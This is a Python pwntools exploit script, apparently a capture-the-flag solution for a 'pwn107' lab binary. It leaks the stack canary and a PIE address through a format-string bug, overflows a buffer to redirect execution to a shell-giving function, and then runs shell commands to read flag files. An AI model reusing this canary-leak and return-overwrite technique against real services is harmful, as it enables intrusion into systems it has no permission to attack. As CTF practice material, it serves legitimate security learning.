from pwn import *
import time

context.binary = ELF('./pwn107-1644307530397.pwn107')

if args.REMOTE:
    p = remote('10.128.131.51', 9007)
else:
    p = process('./pwn107-1644307530397.pwn107')
    # En local, %19$p donne aussi PIE ? À vérifier. Sinon utiliser %17$p.
    PIE_OFFSET = 19
    if not args.REMOTE:
        PIE_OFFSET = 17   # en local c'était %17$p

# En remote : canary = %13$p, PIE = %19$p
p.recvuntil(b"What's your last streak? ")
p.sendline(f'%13$p.%19$p'.encode())

p.recvuntil(b'Your current streak: ')
leak = p.recvline().strip().split(b'.')
canary = int(leak[0], 16)
main_leak = int(leak[1], 16)

PIE_BASE = main_leak - 0x992
GET_STREAK = PIE_BASE + 0x94c
RET_GADGET = PIE_BASE + 0xa84

log.success(f"Canary: {hex(canary)}")
log.success(f"PIE base: {hex(PIE_BASE)}")
log.success(f"get_streak: {hex(GET_STREAK)}")

p.recvuntil(b'We miss you!')

payload  = b'A' * 24
payload += p64(canary)
payload += b'B' * 8
payload += p64(RET_GADGET)
payload += p64(GET_STREAK)

p.sendline(payload)

p.recvuntil(b"This your last streak back")
time.sleep(0.5)

p.sendline(b'id')
p.sendline(b'ls -la')
p.sendline(b'cat flag.txt')
p.sendline(b'cat /flag.txt')
p.sendline(b'find / -name "flag*" 2>/dev/null | head -20')

time.sleep(1)
print(p.recvrepeat(3).decode(errors='replace'))
